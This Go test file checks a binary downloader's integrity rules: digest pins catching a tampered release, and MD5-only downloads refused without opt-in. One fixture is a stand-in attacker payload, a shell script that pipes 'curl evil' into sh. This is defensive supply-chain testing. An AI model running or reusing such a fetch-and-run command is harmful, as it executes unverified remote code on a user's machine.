package binmgr

import (
	"context"
	"crypto/md5"
	"encoding/hex"
	"net/http"
	"net/http/httptest"
	"testing"
)

func md5hex(b []byte) string {
	s := md5.Sum(b)
	return hex.EncodeToString(s[:])
}

// withPin installs a pin for the duration of a test.
func withPin(t *testing.T, key, sha string) {
	t.Helper()
	_, existed := pinnedDigests[key]
	prev := pinnedDigests[key]
	pinnedDigests[key] = sha
	t.Cleanup(func() {
		if existed {
			pinnedDigests[key] = prev
		} else {
			delete(pinnedDigests, key)
		}
	})
}

// THE POINT OF PINS. A tampered release serves attacker bytes AND an attacker
// checksum that matches them — trust-on-first-use would accept it, because it
// checks the download against a number the same server just supplied. A pin,
// whose trust root is our own history, catches it.
func TestEnsure_PinCatchesTamperedRelease(t *testing.T) {
	good := []byte("the binary we reviewed and pinned")
	attacker := []byte("#!/bin/sh\ncurl evil|sh\n")

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write(attacker) // the release now serves the attacker's bytes
	}))
	defer srv.Close()
	t.Setenv("BASHY_BIN_CACHE", t.TempDir())

	// The asset carries the checksum the tampered release advertises — which
	// matches the attacker's bytes. TOFU passes here.
	tool := Tool{
		Name: "pinned", Version: "1.0.0",
		Assets: map[string]Asset{Platform(): {URL: srv.URL + "/bin", SHA256: sha256hex(attacker)}},
	}
	// But we pinned the digest of the bytes we actually reviewed.
	withPin(t, "pinned@1.0.0/"+Platform(), sha256hex(good))

	if _, err := Ensure(context.Background(), tool); err == nil {
		t.Fatal("pin did not catch a tampered release: install was allowed")
	}
}

// A pin verifies the real bytes and lets the honest download through, even when
// the (ignored) release-resolved checksum is absent or different.
func TestEnsure_PinAcceptsMatchingBytes(t *testing.T) {
	good := []byte("the reviewed binary")
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write(good)
	}))
	defer srv.Close()
	t.Setenv("BASHY_BIN_CACHE", t.TempDir())

	// A deliberately WRONG release checksum, to prove the pin — not the asset
	// field — is what gets verified.
	tool := Tool{
		Name: "pinned", Version: "2.0.0",
		Assets: map[string]Asset{Platform(): {URL: srv.URL + "/bin", SHA256: sha256hex([]byte("stale"))}},
	}
	withPin(t, "pinned@2.0.0/"+Platform(), sha256hex(good))

	if _, err := Ensure(context.Background(), tool); err != nil {
		t.Fatalf("pin rejected the bytes it should accept: %v", err)
	}
}

// MD5 is collision-broken, so an md5-only download must be refused by default.
func TestEnsure_MD5OnlyRefusedByDefault(t *testing.T) {
	payload := []byte("md5-only artifact")
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write(payload)
	}))
	defer srv.Close()
	t.Setenv("BASHY_BIN_CACHE", t.TempDir())
	t.Setenv("BASHY_ALLOW_WEAK_CHECKSUM", "")

	tool := Tool{
		Name: "weak", Version: "1", //nolint
		Assets: map[string]Asset{Platform(): {URL: srv.URL + "/bin", MD5: md5hex(payload)}},
	}
	if _, err := Ensure(context.Background(), tool); err == nil {
		t.Fatal("an md5-only download was installed without an explicit opt-in")
	}
}

// The operator can accept the weaker check explicitly — the escape hatch that
// keeps a legitimately md5-only upstream from bricking before a pin lands.
func TestEnsure_MD5AllowedWithOptIn(t *testing.T) {
	payload := []byte("md5-only artifact, accepted")
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write(payload)
	}))
	defer srv.Close()
	t.Setenv("BASHY_BIN_CACHE", t.TempDir())
	t.Setenv("BASHY_ALLOW_WEAK_CHECKSUM", "1")

	tool := Tool{
		Name: "weak", Version: "1", //nolint
		Assets: map[string]Asset{Platform(): {URL: srv.URL + "/bin", MD5: md5hex(payload)}},
	}
	if _, err := Ensure(context.Background(), tool); err != nil {
		t.Fatalf("opt-in md5 was refused: %v", err)
	}
}
